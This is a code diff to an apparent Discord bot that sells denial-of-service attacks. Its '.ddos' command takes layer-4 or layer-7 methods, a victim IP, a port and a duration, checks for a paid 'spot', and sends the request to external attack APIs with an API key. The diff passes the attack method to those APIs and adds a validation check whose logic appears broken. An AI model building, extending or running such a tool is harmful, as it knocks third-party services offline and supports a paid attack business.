@@ -28,7 +28,6 @@ admins  = [1, 2, 3]              # Replace digits with Discord USER-IDs! (admins
 owners  = [1, 2, 3]              # Replace digits with Discord USER-IDs! (owners, they cannot be removed!!)
 token   = 'your_token_lol'                  # Discord Bot token
 bot     = commands.Bot(command_prefix='.')
-helps   = ['Help', 'help', 'HELP', 'halp']
 maxtime = 1200 # The max booting time for our bot. You need to change it, probably.
 
 l4methods = ['TCP', 'UDP', 'STD']             # Our Layer4 methods. Add more if desired!
@@ -93,7 +92,7 @@ async def ddos(ctx, method : str = None, victim : str = None, port : str = None,
         await ctx.send('Sorry, but you need to buy a spot!')
 
     else:
-        if method in helps:
+        if method.upper() == 'HELP':
             l4methodstr = ''
             l7methodstr = ''
 
@@ -113,6 +112,9 @@ async def ddos(ctx, method : str = None, victim : str = None, port : str = None,
         # There was no method
         elif method is None:
             await ctx.send('You need a method!')
+
+        elif method.upper() not in l4methods or method not in l7methods:
+            await ctx.send('Invalid method!!')
 
         # There was no victim
         elif victim is None:
@@ -138,8 +140,8 @@ async def ddos(ctx, method : str = None, victim : str = None, port : str = None,
                     api_key = i["api_key"]
 
                     async with aiohttp.ClientSession() as session:
-                        await session.post(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time}')
-                        #print(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time}')
+                        await session.post(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time}&method={method.upper()}')
+                        #print(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time}&method={method.upper()}')
 
                 except Exception as e:
                     #print(e)
